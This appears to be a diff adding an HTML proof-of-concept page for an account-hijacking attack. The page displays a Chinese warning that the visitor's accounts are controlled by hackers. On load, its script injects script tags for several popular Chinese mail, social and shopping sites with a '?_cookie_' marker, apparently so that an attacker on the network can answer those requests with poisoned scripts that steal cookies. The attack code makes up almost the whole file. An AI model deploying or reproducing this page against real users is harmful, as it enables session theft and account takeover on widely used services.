@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<style>
+		body {
+			background: #000;
+		}
+		div {
+			color: red;
+		}
+	</style>
+</head>
+<body>
+	<div>当你看见该页面时，你的部分账号已被黑客控制了！</div>
+	<script>
+		// test list
+		var LIST = ['mail.163.com', 'mail.126.com', 'qq.com', 'tieba.baidu.com', 'taobao.com', 'www.tmall.com', 'weibo.com'];
+		var POSTFIX = '?_cookie_';
+
+		function load(url) {
+			if (url.indexOf('/') == -1) {
+				url += '/';
+			}
+			var spt = document.createElement('script');
+			spt.src = 'http://' + url + POSTFIX;
+			document.body.appendChild(spt);
+		}
+
+		function start() {
+			for (var i = 0; i < LIST.length; i++) {
+				load(LIST[i]);
+			}
+		}
+		window.onload = start;
+	</script>
+</body>
+</html>
